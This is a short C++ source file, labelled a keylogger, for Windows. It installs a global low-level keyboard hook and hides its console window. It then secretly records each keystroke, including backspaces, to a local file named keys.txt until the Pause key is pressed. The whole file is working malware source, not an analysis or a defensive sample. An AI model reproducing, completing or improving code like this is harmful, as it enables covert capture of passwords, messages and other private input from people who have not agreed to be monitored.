/*
	Code by Luke Honeyball
	5/10/2024
	Keylogger

*/

#include <iostream>
#include <windows.h>
#include <fstream>
//imports
HHOOK hook;
bool running = true;
std::string path = "keys.txt";
std::ofstream File(path);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
		if (pKeyStruct->vkCode == VK_BACK)
		{
			File << " |BACKSPACE| ";
			Sleep(100);
		}else if (pKeyStruct->vkCode == VK_PAUSE) {

			File.close();

			UnhookWindowsHookEx(hook);
			exit(0);
		}
		else {
			for (int x = 0; x < 128; x++) {
				std::cout << pKeyStruct->vkCode;

				if (pKeyStruct->vkCode == x) {
					File << (char)pKeyStruct->vkCode;
					Sleep(100);
				}

			}
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}
//hook process

int main() {
	FreeConsole();//make console invisible
	hook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
	MSG m;
	while (running == true) {

		GetMessage(&m,NULL,0,0);
		TranslateMessage(&m);
		DispatchMessage(&m); 
		//loop
	}
	
	return 0;
}
//revised
